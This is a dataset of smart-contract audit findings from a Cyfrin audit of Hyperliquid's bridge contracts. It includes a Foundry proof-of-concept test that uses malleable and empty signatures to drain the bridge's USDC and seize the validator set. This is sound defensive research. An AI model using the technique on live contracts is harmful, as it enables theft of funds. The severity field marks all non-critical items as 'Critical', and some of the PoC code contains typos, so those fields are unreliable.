{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2023-04-11-cyfrin-hyperliquid-dex-report-001", "doc_id": "cyfrin_2023-04-11-cyfrin-hyperliquid-dex-report", "finding_index": 1, "page_start": null, "title": "[M-01] Bad signature validation, malleability & lack of zero address protection in `updateValidatorSet`", "short_summary": null, "description_md": "### Description\n\nThe `ecrecover` built-in will return `address(0)` if it fails to recover the signer from a message digest and corresponding signature. There is no `address(0)` check in [`Signature::recoverSigner`](https://github.com/hyperliquid-dex/contracts/blob/e0aff464865aa98c09450702d7fb36b1fcd4508c/Signature.sol#L62) or [`Bridge::checkValidatorSignatures`](https://github.com/hyperliquid-dex/contracts/blob/e0aff464865aa98c09450702d7fb36b1fcd4508c/Bridge.sol#L154).\n\nAnyone can submit bad signatures to steal bridge funds, calling `Bridge::withdraw`, or take over the bridge as a solitary validator, calling `Bridge::updateValidatorSet` if the validator set is initialized or updated to be a zero address validator set with threshold power. This is of course highly unlikely as it would not be within the validators' best interest; however, it is still possible and should be mitigated so long as bas signer recovery is an issue.\n\nAdditionally, it is possible to call `Bridge::withdraw` and `Bridge::updateValidatorSet` using malleable validator signatures. Due to the nature of elliptic curves, it is possible to modify a signature to create another unique signature which recovers to the same signer address. Fortunately, the `Bridge::processedWithdrawals` mapping and validator (epoch) checkpoints protect against replay. Along with bad signer recovery, this should be mitigated using the [OpenZeppelin ECDSA library](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/cryptography/ECDSA.sol).\n", "full_markdown": "## [M-01] Bad signature validation, malleability & lack of zero address protection in `updateValidatorSet`\n\n### Description\n\nThe `ecrecover` built-in will return `address(0)` if it fails to recover the signer from a message digest and corresponding signature. There is no `address(0)` check in [`Signature::recoverSigner`](https://github.com/hyperliquid-dex/contracts/blob/e0aff464865aa98c09450702d7fb36b1fcd4508c/Signature.sol#L62) or [`Bridge::checkValidatorSignatures`](https://github.com/hyperliquid-dex/contracts/blob/e0aff464865aa98c09450702d7fb36b1fcd4508c/Bridge.sol#L154).\n\nAnyone can submit bad signatures to steal bridge funds, calling `Bridge::withdraw`, or take over the bridge as a solitary validator, calling `Bridge::updateValidatorSet` if the validator set is initialized or updated to be a zero address validator set with threshold power. This is of course highly unlikely as it would not be within the validators' best interest; however, it is still possible and should be mitigated so long as bas signer recovery is an issue.\n\nAdditionally, it is possible to call `Bridge::withdraw` and `Bridge::updateValidatorSet` using malleable validator signatures. Due to the nature of elliptic curves, it is possible to modify a signature to create another unique signature which recovers to the same signer address. Fortunately, the `Bridge::processedWithdrawals` mapping and validator (epoch) checkpoints protect against replay. Along with bad signer recovery, this should be mitigated using the [OpenZeppelin ECDSA library](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/cryptography/ECDSA.sol).\n\n### Proof of Concept\n\nThe following forge test can be seen to demonstrate these findings:\n\n```solidity\nfunction test_signatureMalleabilityAndBadValidation() public {\n    address sender = makeAddr(\"alice\");\n    address pwner = makeAddr(\"pwner\");\n    uint256 amount = 1e5;\n    uint256 nonce = 0;\n    ValidatorSet memory validatorSet = ValidatorSet(0, s_validators,s_powers);\n    Signature[] memory sigs = _getSignatures(sender, amount, nonce);\n    Signature[] memory sigsCache = sigs;\n    for (uint256 i = 0; i < sigs.length; ++i) {\n        sigs[i].s =\n            uint256(115792089237316195423570985008687907852837564279074904382605163141518161494337) - sigs[i].s;\n        sigs[i].v = sigs[i].v == 27 ? 28 : 27;\n    }\n    console.log(\"withdrawing with malleable signatures\");\n    vm.startPrank(sender);\n    bridge.withdraw(amount, nonce, validatorSet, validatorSet.validators,sigs);\n    console.log(\n        \"fortunately, the `processedWithdrawals` mapping and validator(epoch) checkpoints protect against replay\"\n    );\n    vm.expectRevert(\"Already withdrawn\");\n    bridge.withdraw(amount, nonce, validatorSet, validatorSet.validators,sigsCache);\n    ValidatorSet memory newValidatorSet = ValidatorSet(1, s_newValidators,s_newPowers);\n    vm.expectEmit(true, false, false, true);\n    emit ValidatorSetUpdatedEvent(newValidatorSet.epoch, newValidatorSetvalidators, newValidatorSet.powers);\n    Signature[] memory updateValidatorSigs = _getUpdateValidatorSignature(newValidatorSet, s_validatorKeys);\n    bridge.updateValidatorSet(newValidatorSet, validatorSet, validatorSetvalidators, updateValidatorSigs);\n    for (uint256 i = 0; i < updateValidatorSigs.length; ++i) {\n        updateValidatorSigs[i].s = uint256(\n            115792089237316195423570985008687907852837564279074904382605163141518161494337\n        ) - updateValidatorSigs[i].s;\n        updateValidatorSigs[i].v = updateValidatorSigs[i].v == 27 ? 28 : 27;\n    }\n    ValidatorSet memory emptyValidatorSet = ValidatorSet(2, s_zeroValidators,s_newPowers);\n    bridge.updateValidatorSet(\n        emptyValidatorSet, newValidatorSet, newValidatorSet.validators,_getUpdateValidatorSignatures(emptyValidatorSet, s_newValidatorKeys)\n    );\n    vm.expectRevert(\"New validator set epoch must be greater than the currentepoch\");\n    bridge.updateValidatorSet(newValidatorSet, emptyValidatorSet,emptyValidatorSet.validators, updateValidatorSigs);\n    console.log(\"but what if validator set is updated to zero addressvalidator set with non-zero power?\");\n    address[] memory validatorArr = new address[](1);\n    validatorArr[0] = PWNER;\n    uint256[] memory powerArr = new uint256[](1);\n    powerArr[0] = uint256(1000000);\n    ValidatorSet memory pwnValidatorSet = ValidatorSet(3, validatorArr,powerArr);\n    Signature[] memory emptySigs = new Signature[](3);\n    emptySigs[0] = Signature(0, 0, 0);\n    emptySigs[1] = Signature(0, 0, 0);\n    emptySigs[2] = Signature(0, 0, 0);\n    console.log(\"anyone can submit bad signatures to steal bridge funds\");\n    changePrank(pwner);\n    emit log_named_uint(\"bridge balance before\", IERC20(USDC_ADDRESS)balanceOf(address(bridge)));\n    emit log_named_uint(\"pwner balance before\", IERC20(USDC_ADDRESS).balanceO(pwner));\n    bridge.withdraw(IERC20(USDC_ADDRESS).balanceOf(address(bridge)), 0,emptyValidatorSet, emptyValidatorSet.validators, emptySigs);\n    emit log_named_uint(\"pwner balance after\", IERC20(USDC_ADDRESS).balanceO(pwner));\n    emit log_named_uint(\"bridge balance after\", IERC20(USDC_ADDRESS).balanceO(address(bridge)));\n    vm.expectEmit(true, false, false, true);\n    emit ValidatorSetUpdatedEvent(pwnValidatorSet.epoch, pwnValidatorSetvalidators, pwnValidatorSet.powers);\n    bridge.updateValidatorSet(pwnValidatorSet, emptyValidatorSet,emptyValidatorSet.validators, emptySigs);\n    console.log(\"or take over the bridge as a solitary validator\");\n}\n\nfunction _getUpdateValidatorSignatures(ValidatorSet memory newValidatorSet, uint256[] memory currValidatorKeys)\n    internal\n    view\n    returns (Signature[] memory)\n{\n    Signature[] memory signatures = new Signature[](s_validators.length);\n    bytes32 newCheckpoint =\n        keccak256(abi.encode(newValidatorSet.validators, newValidatorSetpowers, newValidatorSet.epoch));\n    Agent memory agent = Agent(\"a\", newCheckpoint);\n    bytes32 digest = keccak256(abi.encodePacked(\"\\x19\\x01\",LOCALHOST_DOMAIN_HASH, hash(agent)));\n    for (uint256 i = 0; i < s_validators.length; ++i) {\n        (uint8 v, bytes32 r, bytes32 s) = vm.sign(currValidatorKeys[i],digest);\n        signatures[i] = Signature(uint256(r), uint256(s), v);\n    }\n    return signatures;\n}\nfunction _getWithdrawSignatures(address sender, uint256 amount, uint256nonce) internal view returns (Signature[] memory) {\n    Signature[] memory signatures = new Signature[](s_validators.length);\n    Agent memory agent = Agent(\"a\", keccak256(abi.encode(sender, amount,nonce)));\n    bytes32 digest = keccak256(abi.encodePacked(\"\\x19\\x01\",LOCALHOST_DOMAIN_HASH, hash(agent)));\n    for (uint256 i = 0; i < s_validators.length; ++i) {\n        (uint8 v, bytes32 r, bytes32 s) = vm.sign(s_validatorKeys[i], digest);\n        // console.log(\"validator: %s\", i);\n        // console.log(\"v: %s\", uint256(v));\n        // console.log(\"r: %s\", uint256(r));\n        // console.log(\"s: %s\", uint256(s));\n        signatures[i] = Signature(uint256(r), uint256(s), v);\n    }\n    return signatures;\n}\n```\n\n### Impact\n\nGiven the vulnerability described has a low likelihood but high impact, we evaluate the severity to MEDIUM.\n\n### Recommended Mitigation\n\nAs mentioned above, it is recommended to correctly validate recovered signers and protect against signature malleability by using the [OpenZeppelin ECDSA library](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/cryptography/ECDSA.sol). Additionally, add zero address validation to `Bridge::updateValidatorSet` to ensure it is not possible to update the validator set to a vulnerable state.\n\n**Edit (2023-04-14):** OpenZeppelin `ECDSA` has a vulnerability in versions lower than 4.7.3, which can be exploited by an attacker. When using this library, use the latest version of @openzeppelin/contracts, or a version that is newer or at least 4.7.3.\n\n### `f045dbf` Resolution\n\nA zero address check has been added to `Signature.sol::recoverSigner` to address this finding. The client team states that they do not believe this is a feasible exploit since it requires 2/3 of the validators' coordination to perform the bad signature exploit, which only happens when the L1 and bridge’s integrity are already compromised, and that it should instead be a low/NC severity issue. The Cyfrin team maintains that this is medium severity in the scope of this audit given its limited scope and context.\n", "severity": "Medium", "difficulty": null, "type": null, "finding_id": "M-01", "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/hyperliquid-dex/contracts", "org": "hyperliquid-dex", "name": "contracts", "commit": "e0aff464865aa98c09450702d7fb36b1fcd4508c", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2023-04-11-cyfrin-hyperliquid-dex-report.md", "source_mtime": "2025-11-01T12:04:59+00:00", "report_extracted_at": "2025-11-12T02:04:23.909351+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:04:23.910178+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Medium", "Difficulty": null, "Type": null, "Finding ID": "M-01", "Target": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2023-04-11-cyfrin-hyperliquid-dex-report-002", "doc_id": "cyfrin_2023-04-11-cyfrin-hyperliquid-dex-report", "finding_index": 2, "page_start": null, "title": "[M-02] Incorrect initialization of `powerThreshold` and lack of validation", "short_summary": null, "description_md": "### Description\n\nThe `Bridge::powerThreshold` should be 2/3 the sum of the validator power across current validators at any point; however, the [calculation](https://github.com/hyperliquid-dex/contracts/blob/e0aff464865aa98c09450702d7fb36b1fcd4508c/Bridge.sol#L94) in `Bridge2::constructor` is not correct and it's initialized to `(2 * _minTotalValidatorPower) / 3` while it should instead be `powerThreshold = (2 * cumulativePower) / 3;`, i.e. use the return value of `checkNewValidatorPowers` as is the case in `Bridge::updateValidatorSet`.\nFrom the fact that `cumulativePower >= minTotalValidatorPower`, it means the initialized `powerThreshold` is less than reasonable.\nFurthermore, from the communication with the client team, it is understood that `minTotalValidatorPower` is only used to prevent rounding issues and set once and not changed (immutable). Hence it is likely this value is not likely to be around the actual cumulative power but a lot less than it.\nBecause `powerThreshold` is initialized to a fairly less value, this can allow malicious actions that are lack of validation power.\n\nFurthermore, the protocol implements [admin functionality](https://github.com/hyperliquid-dex/contracts/blob/e0aff464865aa98c09450702d7fb36b1fcd4508c/Bridge.sol#L252-L256) whereby `powerThreshold` can be set to an arbitrary value without any validation - this is not recommended and should be subject to the same validation that `powerThreshold` is at least 2/3 the sum of the total validator power and not over the sum of the total validator power.\n\n### Impact\n\nIt is possible malicious actions that are lack of validation power are allowed due to wrong initialization of `powerThreshold`.\nBecause the initializer is assumed to be called by an admin and there is also another admin function to change the `powerThreshold`, we evaluate the severity to MEDIUM.\n", "full_markdown": "## [M-02] Incorrect initialization of `powerThreshold` and lack of validation\n\n### Description\n\nThe `Bridge::powerThreshold` should be 2/3 the sum of the validator power across current validators at any point; however, the [calculation](https://github.com/hyperliquid-dex/contracts/blob/e0aff464865aa98c09450702d7fb36b1fcd4508c/Bridge.sol#L94) in `Bridge2::constructor` is not correct and it's initialized to `(2 * _minTotalValidatorPower) / 3` while it should instead be `powerThreshold = (2 * cumulativePower) / 3;`, i.e. use the return value of `checkNewValidatorPowers` as is the case in `Bridge::updateValidatorSet`.\nFrom the fact that `cumulativePower >= minTotalValidatorPower`, it means the initialized `powerThreshold` is less than reasonable.\nFurthermore, from the communication with the client team, it is understood that `minTotalValidatorPower` is only used to prevent rounding issues and set once and not changed (immutable). Hence it is likely this value is not likely to be around the actual cumulative power but a lot less than it.\nBecause `powerThreshold` is initialized to a fairly less value, this can allow malicious actions that are lack of validation power.\n\nFurthermore, the protocol implements [admin functionality](https://github.com/hyperliquid-dex/contracts/blob/e0aff464865aa98c09450702d7fb36b1fcd4508c/Bridge.sol#L252-L256) whereby `powerThreshold` can be set to an arbitrary value without any validation - this is not recommended and should be subject to the same validation that `powerThreshold` is at least 2/3 the sum of the total validator power and not over the sum of the total validator power.\n\n### Impact\n\nIt is possible malicious actions that are lack of validation power are allowed due to wrong initialization of `powerThreshold`.\nBecause the initializer is assumed to be called by an admin and there is also another admin function to change the `powerThreshold`, we evaluate the severity to MEDIUM.\n\n### Recommended Mitigation\n\n- Initialize `powerThreshold` to the 2/3 the sum of the initial validator powers.\n- Add validation for the new `powerThreshold` in `Bridge::changePowerThreshold()` to allow only reasonable values (ranging from 2/3 to total of the current cumulative validation power).\n\n### `f045dbf` Resolution\n\nThe calculation now uses the `cumulativePower` returned from `checkNewValidatorPowers` to set `powerThreshold` in the constructor. The client team states that this is also low/NC severity because the initial set of validators is intended to be the team, and future validator updates are not prone to this issue. The Cyfrin team maintains that this is medium severity in the scope of this audit given its limited scope and context.\n", "severity": "Medium", "difficulty": null, "type": null, "finding_id": "M-02", "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/hyperliquid-dex/contracts", "org": "hyperliquid-dex", "name": "contracts", "commit": "e0aff464865aa98c09450702d7fb36b1fcd4508c", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2023-04-11-cyfrin-hyperliquid-dex-report.md", "source_mtime": "2025-11-01T12:04:59+00:00", "report_extracted_at": "2025-11-12T02:04:23.909351+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:04:23.910178+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Medium", "Difficulty": null, "Type": null, "Finding ID": "M-02", "Target": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2023-04-11-cyfrin-hyperliquid-dex-report-003", "doc_id": "cyfrin_2023-04-11-cyfrin-hyperliquid-dex-report", "finding_index": 3, "page_start": null, "title": "[NC-01] Make `minTotalValidatorPower` immutable", "short_summary": null, "description_md": null, "full_markdown": "## [NC-01] Make `minTotalValidatorPower` immutable\n\nGiven that `Bridge::minTotalValidatorPower` is initialized once in the constructor and never modified thereafter, it can be made immutable. This also has the effect of reducing gas usage in functions which currently read its value from storage.\n\n### `f045dbf` Resolution\n\n`minTotalValidatorPower` is now immutable.\n", "severity": "Critical", "difficulty": null, "type": null, "finding_id": "NC-01", "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/hyperliquid-dex/contracts", "org": "hyperliquid-dex", "name": "contracts", "commit": "e0aff464865aa98c09450702d7fb36b1fcd4508c", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2023-04-11-cyfrin-hyperliquid-dex-report.md", "source_mtime": "2025-11-01T12:04:59+00:00", "report_extracted_at": "2025-11-12T02:04:23.909351+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:04:23.910178+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Critical", "Difficulty": null, "Type": null, "Finding ID": "NC-01", "Target": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2023-04-11-cyfrin-hyperliquid-dex-report-004", "doc_id": "cyfrin_2023-04-11-cyfrin-hyperliquid-dex-report", "finding_index": 4, "page_start": null, "title": "[NC-02] Avoid using an initializer unless absolutely necessary", "short_summary": null, "description_md": null, "full_markdown": "## [NC-02] Avoid using an initializer unless absolutely necessary\n\n[This comment](https://github.com/hyperliquid-dex/contracts/blob/e0aff464865aa98c09450702d7fb36b1fcd4508c/Bridge.sol#L85-L86) references the potential introduction of a separate initializer but it should be noted that bad initialization is the cause of many exploits in the wild and so should be avoided wherever possible.\n\n### `f045dbf` Resolution\n\nThe comment has been removed.\n", "severity": "Critical", "difficulty": null, "type": null, "finding_id": "NC-02", "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/hyperliquid-dex/contracts", "org": "hyperliquid-dex", "name": "contracts", "commit": "e0aff464865aa98c09450702d7fb36b1fcd4508c", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2023-04-11-cyfrin-hyperliquid-dex-report.md", "source_mtime": "2025-11-01T12:04:59+00:00", "report_extracted_at": "2025-11-12T02:04:23.909351+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:04:23.910178+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Critical", "Difficulty": null, "Type": null, "Finding ID": "NC-02", "Target": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2023-04-11-cyfrin-hyperliquid-dex-report-005", "doc_id": "cyfrin_2023-04-11-cyfrin-hyperliquid-dex-report", "finding_index": 5, "page_start": null, "title": "[NC-03] Use calldata for all function arguments that are not modified", "short_summary": null, "description_md": null, "full_markdown": "## [NC-03] Use calldata for all function arguments that are not modified\n\nIf function arguments are not intended to be modified then it is best practice to pass them as calldata arguments rather than memory, for example in [https://github.com/hyperliquid-dex/contracts/blob/e0aff464865aa98c09450702d7fb36b1fcd4508c/Bridge.sol#LL94C48-L94C48](`Bridge::updateValidatorSet`).\n\n### `f045dbf` Resolution\n\nThe client team acknowledges this finding with the following comment:\n\n> Through testing we found that using memory seems to require less gas than calldata on Arbitrum, which is why we wrote everything using memory to begin with.\n", "severity": "Critical", "difficulty": null, "type": null, "finding_id": "NC-03", "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/hyperliquid-dex/contracts", "org": "hyperliquid-dex", "name": "contracts", "commit": "e0aff464865aa98c09450702d7fb36b1fcd4508c", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2023-04-11-cyfrin-hyperliquid-dex-report.md", "source_mtime": "2025-11-01T12:04:59+00:00", "report_extracted_at": "2025-11-12T02:04:23.909351+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:04:23.910178+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Critical", "Difficulty": null, "Type": null, "Finding ID": "NC-03", "Target": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2023-04-11-cyfrin-hyperliquid-dex-report-006", "doc_id": "cyfrin_2023-04-11-cyfrin-hyperliquid-dex-report", "finding_index": 6, "page_start": null, "title": "[NC-04] `updateValidatorSet` block scope is not necessary", "short_summary": null, "description_md": null, "full_markdown": "## [NC-04] `updateValidatorSet` block scope is not necessary\n\nThe block scope in `Bridge::updateValidatorSet` is not necessary as the contract successfully compiles without it and so can be removed.\n\n### `f045dbf` Resolution\n\nThe block scope has been removed.\n", "severity": "Critical", "difficulty": null, "type": null, "finding_id": "NC-04", "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/hyperliquid-dex/contracts", "org": "hyperliquid-dex", "name": "contracts", "commit": "e0aff464865aa98c09450702d7fb36b1fcd4508c", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2023-04-11-cyfrin-hyperliquid-dex-report.md", "source_mtime": "2025-11-01T12:04:59+00:00", "report_extracted_at": "2025-11-12T02:04:23.909351+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:04:23.910178+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Critical", "Difficulty": null, "Type": null, "Finding ID": "NC-04", "Target": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2023-04-11-cyfrin-hyperliquid-dex-report-007", "doc_id": "cyfrin_2023-04-11-cyfrin-hyperliquid-dex-report", "finding_index": 7, "page_start": null, "title": "[NC-05] Emit events before interaction", "short_summary": null, "description_md": null, "full_markdown": "## [NC-05] Emit events before interaction\n\nTo strictly conform to checks-effect-interactions, it is recommended to emit events prior to any [external interactions](https://github.com/hyperliquid-dex/contracts/blob/e0aff464865aa98c09450702d7fb36b1fcd4508c/Bridge.sol#L122-L123). This is generally advised to ensure correct migration through state reconstruction, which in this case should not be affected given `Bridge::deposit` is marked as `nonReentrant`, but it is still good practice.\n\n### `f045dbf` Resolution\n\nEvents are now emitted before external interactions.\n", "severity": "Critical", "difficulty": null, "type": null, "finding_id": "NC-05", "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/hyperliquid-dex/contracts", "org": "hyperliquid-dex", "name": "contracts", "commit": "e0aff464865aa98c09450702d7fb36b1fcd4508c", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2023-04-11-cyfrin-hyperliquid-dex-report.md", "source_mtime": "2025-11-01T12:04:59+00:00", "report_extracted_at": "2025-11-12T02:04:23.909351+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:04:23.910178+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Critical", "Difficulty": null, "Type": null, "Finding ID": "NC-05", "Target": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2023-04-11-cyfrin-hyperliquid-dex-report-008", "doc_id": "cyfrin_2023-04-11-cyfrin-hyperliquid-dex-report", "finding_index": 8, "page_start": null, "title": "[NC-06] Make USDC amount naming more verbose", "short_summary": null, "description_md": null, "full_markdown": "## [NC-06] Make USDC amount naming more verbose\n\nThe naming of the USDC amount parameter in [`Bridge::deposit and Bridge::withdraw`](https://github.com/hyperliquid-dex/contracts/blob/e0aff464865aa98c09450702d7fb36b1fcd4508c/Bridge.sol#L120-L152) is not clear, i.e. change `uint256 usdc` to `uin256 usdcAmount`.\n\n### `f045dbf` Resolution\n\nThe client team acknowledges this finding with the following comment:\n\n> Does not seem like a useful change for us. `usdc` is clear since its of type `uint256`, and we use the same convention in the l1 code and solidity event fields\n", "severity": "Critical", "difficulty": null, "type": null, "finding_id": "NC-06", "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/hyperliquid-dex/contracts", "org": "hyperliquid-dex", "name": "contracts", "commit": "e0aff464865aa98c09450702d7fb36b1fcd4508c", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2023-04-11-cyfrin-hyperliquid-dex-report.md", "source_mtime": "2025-11-01T12:04:59+00:00", "report_extracted_at": "2025-11-12T02:04:23.909351+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:04:23.910178+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Critical", "Difficulty": null, "Type": null, "Finding ID": "NC-06", "Target": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2023-04-11-cyfrin-hyperliquid-dex-report-009", "doc_id": "cyfrin_2023-04-11-cyfrin-hyperliquid-dex-report", "finding_index": 9, "page_start": null, "title": "[NC-07] Rename file to `Bridge2.sol` to match the contract name", "short_summary": null, "description_md": null, "full_markdown": "## [NC-07] Rename file to `Bridge2.sol` to match the contract name\n\nThe `Bridge2` contract resides in `Bridge.sol`; however, it is best practice to follow the convention of one contract per file with the same name.\n\n### `f045dbf` Resolution\n\nThe client team has renamed the contract to `Bridge.sol` with the following comment:\n\n> We call it Bridge2 internally until it replaces the current bridge, at which point we will rename everything to Bridge.\n", "severity": "Critical", "difficulty": null, "type": null, "finding_id": "NC-07", "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/hyperliquid-dex/contracts", "org": "hyperliquid-dex", "name": "contracts", "commit": "e0aff464865aa98c09450702d7fb36b1fcd4508c", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2023-04-11-cyfrin-hyperliquid-dex-report.md", "source_mtime": "2025-11-01T12:04:59+00:00", "report_extracted_at": "2025-11-12T02:04:23.909351+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:04:23.910178+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Critical", "Difficulty": null, "Type": null, "Finding ID": "NC-07", "Target": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2023-04-11-cyfrin-hyperliquid-dex-report-010", "doc_id": "cyfrin_2023-04-11-cyfrin-hyperliquid-dex-report", "finding_index": 10, "page_start": null, "title": "[NC-08] Add missing NatSpec comments to document function parameters and behaviour", "short_summary": null, "description_md": null, "full_markdown": "## [NC-08] Add missing NatSpec comments to document function parameters and behaviour\n\nIt is recommended to document all function behaviours and parameters, especially if they are public-facing.\n\n### `f045dbf` Resolution\n\nThe client team acknowledges this finding with the following comment:\n\n> Light comments were added to functions in `Bridge.sol`.\n", "severity": "Critical", "difficulty": null, "type": null, "finding_id": "NC-08", "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/hyperliquid-dex/contracts", "org": "hyperliquid-dex", "name": "contracts", "commit": "e0aff464865aa98c09450702d7fb36b1fcd4508c", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2023-04-11-cyfrin-hyperliquid-dex-report.md", "source_mtime": "2025-11-01T12:04:59+00:00", "report_extracted_at": "2025-11-12T02:04:23.909351+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:04:23.910178+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Critical", "Difficulty": null, "Type": null, "Finding ID": "NC-08", "Target": null}}
